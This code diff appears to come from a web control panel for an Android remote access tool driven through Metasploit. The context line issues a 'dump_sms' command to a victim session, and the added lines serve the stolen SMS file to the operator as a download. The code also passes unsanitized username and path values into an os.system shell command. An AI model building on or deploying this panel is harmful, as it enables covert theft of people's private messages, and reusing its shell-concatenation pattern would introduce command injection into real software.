@@ -91,6 +91,15 @@ def dumpsms(request):
 
     os.system('tmux send-keys -t '+str(username)+' "dump_sms -o '+str(dir)+'""\n"')
 
+##down
+    username = request.user.username
+    file_path = dir
+    if os.path.exists(file_path):
+        with open(file_path, 'rb') as fh:
+            response = HttpResponse(fh.read(), content_type="application/vnd.ms-excel")
+            response['Content-Disposition'] = 'inline; filename=' + os.path.basename(file_path)
+            return response
+
     return redirect('RAT:msf/android/listen')
 
 def dumpcontacts(request):
